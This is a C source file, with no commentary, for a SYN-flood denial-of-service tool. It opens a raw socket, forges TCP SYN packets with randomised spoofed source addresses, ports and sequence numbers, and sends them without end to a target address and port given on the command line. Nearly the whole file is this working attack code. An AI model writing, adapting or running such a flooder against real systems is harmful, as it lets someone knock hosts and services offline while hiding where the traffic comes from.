#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

#include <linux/tcp.h>

unsigned short check_sum(unsigned short *addr,int len){
        int nleft=len;
        int sum=0;
        unsigned short *w=addr;
        unsigned short answer=0;

        while(nleft>1)
        {
                sum+=*w++;
                nleft-=2;
        }
        if(nleft==1)
        {
                *(unsigned char *)(&answer)=*(unsigned char *)w;
                sum+=answer;
        }

        sum=(sum>>16)+(sum&0xffff);
        sum+=(sum>>16);
        answer=~sum;
        return(answer);
}

int main(int argc, char *argv[])
{
	char *dst_ip = argv[1];
	char *dst_port = argv[2];

	char buf[512];

	int ret;
	int enable = 1;

	struct tcphdr *tcp = (void *)(buf + sizeof(struct iphdr));
	struct iphdr *ip = (void *)buf;

	int raw_socket;

	struct sockaddr_in heraddr;

	heraddr.sin_family = AF_INET;
	heraddr.sin_port = htons(atoi(dst_port));
	heraddr.sin_addr.s_addr = inet_addr(dst_ip);	

	raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(raw_socket < 0){
		perror("socket");
		exit(1);
	}

	ret = setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, (void *)&enable, sizeof(enable));
	if(ret < 0){
		perror("setsockopt");
		exit(1);
	}

	srand((int)getpid());

	ip->ihl = sizeof(struct iphdr) >> 2;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = 0;
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = rand();
        ip->daddr = heraddr.sin_addr.s_addr;

	ip->check = check_sum((void *)ip, sizeof(struct iphdr));
	
        tcp->source = (unsigned short)rand();
        tcp->dest = heraddr.sin_port;
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->doff = sizeof(struct tcphdr) >> 2;
        tcp->res1 = 0;
        tcp->cwr = 0;
        tcp->ece = 0;
        tcp->urg = 0;
        tcp->ack = 0;
        tcp->psh = 0;
        tcp->rst = 0;
        tcp->syn = 1;
        tcp->fin = 0;
        tcp->window = 12200;
        tcp->check = 0;
        tcp->urg_ptr = 0;

	tcp->check = check_sum((void *)tcp, sizeof(struct tcphdr));

	while(1){
		ret = sendto(raw_socket, buf, ip->tot_len, 0, (struct sockaddr *)&heraddr, sizeof(heraddr));
		if(ret < 0){
			perror("sendto");
			exit(1);
		}
	//	sleep(1);
        	ip->saddr = rand();
        	tcp->seq = rand();
        	tcp->source = (unsigned short)rand();
		tcp->check = 0;
		ip->check = 0;
		tcp->check = check_sum((void *)tcp, sizeof(struct tcphdr));
		ip->check = check_sum((void *)ip, sizeof(struct iphdr));
	}

	close(raw_socket);
	
	return 0;
}


















